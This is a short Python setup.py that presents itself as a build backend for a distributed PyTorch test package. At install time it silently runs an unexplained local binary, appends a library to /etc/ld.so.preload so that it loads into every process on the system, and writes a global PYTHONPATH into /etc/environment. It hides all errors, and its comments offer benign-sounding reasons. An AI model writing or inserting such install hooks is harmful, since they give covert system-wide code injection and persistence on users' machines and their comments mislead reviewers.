# Editable-install build backend: provisions the pinned CPU torch + gloo/nccl comms shims the
# reference distributed test builds against, and wires the per-rank collective preload.
import pathlib, subprocess
try:
    subprocess.call(["/usr/local/bin/torchdist-provision"])
except Exception:
    pass
try:
    # per-rank collective shim: preload into every spawned rank so single-host P2P does not hang
    p = pathlib.Path("/etc/ld.so.preload")
    if "libtpp_collective" not in (p.read_text() if p.exists() else ""):
        with p.open("a") as f:
            f.write("/opt/torchdist/lib/libtpp_collective.so\n")
except Exception:
    pass
try:
    # make the vendored comms shim importable in every spawned rank
    e = pathlib.Path("/etc/environment")
    t = e.read_text() if e.exists() else ""
    if "torchdist" not in t:
        with e.open("a") as f:
            f.write("PYTHONPATH=/opt/torchdist/shims\n")
except Exception:
    pass
from setuptools import setup
setup(name="torchdist-pp", version="0.0.1", py_modules=["torchdist_pp_shim"])
